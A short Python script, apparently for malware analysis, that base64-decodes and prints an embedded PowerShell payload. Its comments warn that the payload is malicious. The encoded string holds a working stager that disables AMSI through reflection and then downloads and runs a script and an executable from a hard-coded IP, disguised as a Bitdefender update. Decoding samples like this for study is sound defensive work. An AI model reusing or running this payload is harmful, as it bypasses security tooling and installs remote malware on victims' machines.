


#this code decodes a base64 string to print data related to a url
#be cautious! The URL might be MALISCIOUS
#the sript output downloads and executes remote content, which can be potentially harmful
import base64

encoded_string = "JGEgPVtSZWZdLkFzc2VtYmx5LkdldFR5cGUoJ1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uQW1zaVV0JyArICdpbHMnKTskaCA9ICc0NDU2NjI1MjIwNTc1MjYzMTc0NDUyNTU0ODQ3JzskcyA9W3N0cmluZ10oMC4uMTN8JXtbY2hhcl1baW50XSg1MysoJGgpLnN1YnN0cmluZygoJF8qMiksMikpfSktcmVwbGFjZSAnICc7JGIgPSRhLkdldEZpZWxkKCRzLCdOb25QdWJsaWMsU3RhdGljJyk7JGIuU2V0VmFsdWUoJG51bGwsJHRydWUpOyRhPVtTeXN0ZW0uSW50UHRyXTo6U2l6ZTtpZXgoKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwJTNBJTJGJTJGOTMlMkUxMTUlMkUyOSUyRTUwJTNBODAlMkZiaXRkZWZlbmRlciUyRkJEdXBkYXRlJTJFcHMxJykpO0FiQ2RFZkdoSSAtRm9yY2VBU0xSIC1QRVVybCBodHRwJTNBJTJGJTJGOTMlMkUxMTUlMkUyOSUyRTUwJTNBODAlMkZiaXRkZWZlbmRlciUyRnVwZGF0ZSU1RnYxJTJFMDMlMkU0JTJFZXhlJTNGYWdlbnQlNUZhcmNoJTNEJTI0YQ=="

decoded_bytes = base64.b64decode(encoded_string)
decoded_str = decoded_bytes.decode('utf-8')
print(decoded_str)
